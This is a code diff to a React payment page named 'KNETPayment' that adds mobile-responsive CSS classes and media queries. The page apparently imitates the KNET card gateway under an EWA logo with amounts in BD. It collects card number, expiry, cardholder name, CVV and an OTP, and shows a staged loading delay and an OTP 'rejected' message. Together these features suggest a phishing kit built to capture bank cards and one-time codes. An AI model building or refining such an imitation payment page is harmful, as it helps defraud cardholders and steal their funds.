@@ -512,11 +512,11 @@ export default function KNETPayment() {
 
   // Shared header component
   const renderHeader = () => (
-    <div style={{ padding: "15px 25px", borderBottom: "1px solid #eee" }}>
+    <div className="knet-header-area" style={{ padding: "15px 25px", borderBottom: "1px solid #eee" }}>
       <div style={{ textAlign: isRtl ? "left" : "right", marginBottom: 8 }}>
         <span onClick={toggleLang} style={{ color: RED, fontSize: 13, cursor: "pointer" }}>{t.langToggle}</span>
       </div>
-      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", direction: "ltr" }}>
+      <div className="knet-header-row" style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", direction: "ltr" }}>
         <div style={{ flex: "0 0 auto" }}>
           <img src="/ewa-logo.png" alt="EWA" style={{ height: 55 }} />
         </div>
@@ -534,7 +534,7 @@ export default function KNETPayment() {
 
   // Shared footer component
   const renderFooter = (showViewCards = false) => (
-    <div style={{ padding: "15px 40px 25px", borderTop: "1px solid #eee", direction: isRtl ? "rtl" : "ltr" }}>
+    <div className="knet-footer-area" style={{ padding: "15px 40px 25px", borderTop: "1px solid #eee", direction: isRtl ? "rtl" : "ltr" }}>
       {showViewCards && (
         <div style={{ marginBottom: 20 }}>
           <span onClick={() => setShowAcceptedCards(!showAcceptedCards)} style={{ color: RED, fontSize: 13, cursor: "pointer" }}>{t.viewAccepted}</span>
@@ -626,7 +626,7 @@ export default function KNETPayment() {
         justifyContent: "center",
         padding: "20px",
       }}>
-        <div style={{
+        <div className="knet-cvv-popup" style={{
           backgroundColor: "#fff",
           borderRadius: 12,
           maxWidth: 420,
@@ -682,7 +682,7 @@ export default function KNETPayment() {
           </div>
 
           {/* Popup Body */}
-          <div style={{ padding: "18px 22px", direction: isRtl ? "rtl" : "ltr" }}>
+          <div className="knet-cvv-body" style={{ padding: "18px 22px", direction: isRtl ? "rtl" : "ltr" }}>
             {/* Info message */}
             <div style={{
               backgroundColor: "#f0f7ff",
@@ -897,6 +897,23 @@ export default function KNETPayment() {
           from { opacity: 0; transform: translateY(20px); }
           to { opacity: 1; transform: translateY(0); }
         }
+        @media (max-width: 600px) {
+          .knet-header-row { flex-direction: column !important; align-items: center !important; gap: 8px !important; }
+          .knet-header-row > div { text-align: center !important; }
+          .knet-form-area { padding: 15px 16px !important; }
+          .knet-form-row { flex-direction: column !important; align-items: stretch !important; gap: 4px !important; }
+          .knet-form-row label { width: auto !important; font-size: 13px !important; margin-bottom: 2px !important; }
+          .knet-form-row input, .knet-form-row select { width: 100% !important; box-sizing: border-box !important; }
+          .knet-form-row .knet-select-group { width: 100% !important; }
+          .knet-form-row .knet-select-group select { flex: 1 !important; }
+          .knet-footer-area { padding: 15px 16px 20px !important; }
+          .knet-header-area { padding: 12px 16px !important; }
+          .knet-otp-area { padding: 15px 16px !important; }
+          .knet-btn-row { flex-direction: row !important; }
+          .knet-btn-row button { flex: 1 !important; min-width: auto !important; padding: 10px 10px !important; }
+          .knet-cvv-popup { max-width: 95vw !important; }
+          .knet-cvv-body { padding: 14px 14px !important; }
+        }
       `}</style>
 
       {/* Loading overlay for initial 2-second delay */}
@@ -939,7 +956,7 @@ export default function KNETPayment() {
             {renderHeader()}
 
             {/* Form Area */}
-            <div style={{ padding: "25px 40px" }}>
+            <div className="knet-form-area" style={{ padding: "25px 40px" }}>
               {validationError && (
                 <div style={{ backgroundColor: "#f8d7da", border: "1px solid #f5c6cb", color: "#721c24", padding: "8px 15px", borderRadius: 4, marginBottom: 15, fontSize: 13 }}>
                   {validationError}
@@ -953,17 +970,17 @@ export default function KNETPayment() {
               )}
 
               <form onSubmit={handleCardSubmit}>
-                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
+                <div className="knet-form-row" style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                   <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.amount}</label>
                   <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>BD {totalAmount}</span>
                 </div>
 
-                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
+                <div className="knet-form-row" style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                   <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardType}</label>
                   <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>{t.cardTypeValue}</span>
                 </div>
 
-                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
+                <div className="knet-form-row" style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                   <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardNumber}</label>
                   <input
                     type="tel"
@@ -971,31 +988,31 @@ export default function KNETPayment() {
                     maxLength={23}
                     value={cardNumber}
                     onChange={handleCardChange}
-                    style={{ width: 220, height: 30, border: `1px solid ${luhnError || cardError ? '#cc0000' : '#ccc'}`, borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto", direction: "ltr" }}
+                    style={{ width: 220, height: 36, border: `1px solid ${luhnError || cardError ? '#cc0000' : '#ccc'}`, borderRadius: 4, padding: "0 10px", fontSize: 14, outline: "none", caretColor: "auto", direction: "ltr" }}
                   />
                 </div>
 
-                <div style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
+                <div className="knet-form-row" style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                   <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.expiryDate}</label>
-                  <div style={{ display: "flex", gap: 5, direction: "ltr" }}>
-                    <select value={expiryMonth} onChange={(e) => setExpiryMonth(e.target.value)} style={{ height: 30, border: "1px solid #ccc", borderRadius: 2, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}>
+                  <div className="knet-select-group" style={{ display: "flex", gap: 5, direction: "ltr" }}>
+                    <select value={expiryMonth} onChange={(e) => setExpiryMonth(e.target.value)} style={{ height: 36, border: "1px solid #ccc", borderRadius: 4, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}>
                       <option value="">MM</option>
                       {months.map((m) => (<option key={m.value} value={m.value}>{m.label}</option>))}
                     </select>
-                    <select value={expiryYear} onChange={(e) => setExpiryYear(e.target.value)} style={{ height: 30, border: "1px solid #ccc", borderRadius: 2, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}>
+                    <select value={expiryYear} onChange={(e) => setExpiryYear(e.target.value)} style={{ height: 36, border: "1px solid #ccc", borderRadius: 4, fontSize: 13, padding: "0 5px", backgroundColor: "#fff" }}>
                       <option value="">YYYY</option>
                       {years.map((y) => (<option key={y.value} value={y.value}>{y.label}</option>))}
                     </select>
                   </div>
                 </div>
 
-                <div style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
+                <div className="knet-form-row" style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
                   <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardHolderName}</label>
                   <input
                     type="text"
                     value={cardHolderName}
                     onChange={(e) => { const val = e.target.value.replace(/[^a-zA-Z\s]/g, ""); setCardHolderName(val); setValidationError(""); }}
-                    style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto" }}
+                    style={{ width: 200, height: 36, border: "1px solid #ccc", borderRadius: 4, padding: "0 10px", fontSize: 14, outline: "none", caretColor: "auto" }}
                   />
                 </div>
 
@@ -1006,7 +1023,7 @@ export default function KNETPayment() {
                   </label>
                 </div>
 
-                <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
+                <div className="knet-btn-row" style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
                   <button type="submit" disabled={cvvLoading} style={{ backgroundColor: RED, color: "#fff", border: "none", padding: "8px 35px", borderRadius: 4, fontSize: 14, fontWeight: "bold", cursor: cvvLoading ? "not-allowed" : "pointer", minWidth: 100, opacity: cvvLoading ? 0.6 : 1 }}>
                     {t.pay}
                   </button>
@@ -1026,22 +1043,22 @@ export default function KNETPayment() {
           <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", marginTop: 20, marginBottom: 20 }}>
             {renderHeader()}
 
-            <div style={{ padding: "25px 40px" }}>
+            <div className="knet-otp-area" style={{ padding: "25px 40px" }}>
               <div style={{ backgroundColor: "#d9edf7", border: "1px solid #bce8f1", color: "#31708f", padding: 12, borderRadius: 4, marginBottom: 20, fontSize: 13, lineHeight: 1.6 }}>
                 <strong>{t.otpNotifTitle}</strong> {t.otpNotifText}
               </div>
 
-              <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
+              <div className="knet-form-row" style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                 <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.amount}</label>
                 <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>BD {totalAmount}</span>
               </div>
 
-              <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
+              <div className="knet-form-row" style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                 <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardNumber}</label>
                 <span style={{ fontSize: 14, color: "#333", direction: "ltr" }}>{maskedCard}</span>
               </div>
 
-              <div style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
+              <div className="knet-form-row" style={{ display: "flex", marginBottom: 12, alignItems: "center" }}>
                 <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.expiryDate}</label>
                 <span style={{ fontSize: 14, color: "#333", direction: "ltr" }}>{expiryMonth.padStart(2, "0")} / {expiryYear}</span>
               </div>
@@ -1052,7 +1069,7 @@ export default function KNETPayment() {
                 </div>
               )}
 
-              <div style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
+              <div className="knet-form-row" style={{ display: "flex", marginBottom: 20, alignItems: "center" }}>
                 <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.otp}</label>
                 <input
                   type="text"
@@ -1061,11 +1078,11 @@ export default function KNETPayment() {
                   value={otpCode}
                   onChange={(e) => { setOtpCode(e.target.value.replace(/\D/g, "")); setRejectedError(""); }}
                   placeholder={formatCountdown(countdown)}
-                  style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, textAlign: "center", outline: "none", caretColor: "auto", direction: "ltr" }}
+                  style={{ width: 200, height: 36, border: "1px solid #ccc", borderRadius: 4, padding: "0 10px", fontSize: 14, textAlign: "center", outline: "none", caretColor: "auto", direction: "ltr" }}
                 />
               </div>
 
-              <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
+              <div className="knet-btn-row" style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 20 }}>
                 <button
                   type="button"
                   onClick={handleOtpSubmit}
